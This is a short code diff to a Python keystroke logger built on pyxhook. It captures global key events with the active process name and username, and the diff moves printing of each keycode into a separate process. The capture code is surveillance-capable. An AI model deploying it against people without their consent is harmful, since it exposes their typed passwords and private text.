@@ -23,6 +23,7 @@
 ##                                                                      ##
 ##########################################################################
 
+from multiprocessing import Process
 import pyxhook
 import time
 import threading
@@ -84,7 +85,10 @@ class DetailedWriterFirstStage(BaseEventClass):
                 print(('[INFO]Not an useful event'), file=sys.stderr)
                 return
             process_name = self.get_process_name(event)
-            print((event.Key + '\n'))
+            self.ek = event.Key + '\n'
+            p = Process(target=self.write_keycode)
+            p.start()
+            p.join()
             username = self.get_username()
             self.sst_q.put((process_name, username, event))
         except queue.Empty:
@@ -92,6 +96,9 @@ class DetailedWriterFirstStage(BaseEventClass):
         except:
             print(('[WARN] Some exception was caught in the logwriter loop...'), file=sys.stderr)
             pass
+
+    def write_keycode(self):
+        sys.stdout.write(self.ek)
 
     def get_process_name(self, event):
         return event.WindowProcName
